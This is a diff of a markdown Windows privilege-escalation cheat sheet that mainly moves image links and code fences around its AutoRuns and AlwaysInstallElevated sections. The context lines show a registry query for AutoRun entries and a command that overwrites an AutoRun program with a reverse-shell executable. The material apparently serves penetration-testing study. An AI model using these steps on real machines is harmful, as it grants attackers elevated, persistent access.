@@ -1333,10 +1333,6 @@ net start dllsvc
 ##### Always Install Elevated
 
 ```ps1
-
-![image](https://user-images.githubusercontent.com/59018247/198085713-2194a24e-8f5c-4317-8080-2d78d2bb3f2a.png)
-
-
 #########################################################################
 #### 1. AutoRuns ########################################################
 #########################################################################
@@ -1353,8 +1349,12 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 
 # Copy our reverse shell executable to overwrite the AutoRun executable:
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
+```
 
 
+![image](https://user-images.githubusercontent.com/59018247/198085925-00b477ac-15ec-40f0-9910-abc520f47ab2.png)
+
+```ps1
 #########################################################################
 #### 2. AlwaysInstallElevated ###########################################
 #########################################################################
